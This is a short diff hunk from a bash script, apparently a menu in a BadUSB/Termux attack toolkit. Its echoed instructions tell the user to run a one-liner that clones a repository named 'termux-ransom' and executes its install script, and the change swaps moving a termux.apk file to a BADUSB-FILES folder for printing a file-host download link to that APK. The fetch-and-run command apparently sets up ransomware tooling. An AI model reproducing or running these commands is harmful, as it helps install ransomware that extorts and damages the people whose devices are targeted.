@@ -101,8 +101,7 @@ do
 				sleep 5
 				echo -e "[$excla0] And run this commands: $red pkg install git -y ; git clone https://github.com/z4kc/termux-ransom ; bash install.sh\033[m"
 				sleep 5
-				echo -e "[$excla] Termux moved to /sdcard/BADUSB-FILES"
-				mv termux.apk /sdcard/BADUSB-FILES
+				echo -e "[$excla] The link to install is: $red https://www.mediafire.com/file/6vlu7ccx95o0iuw/termux.apk/file \033[m"
 				echo ""
 				read -p "press enter" 
 				
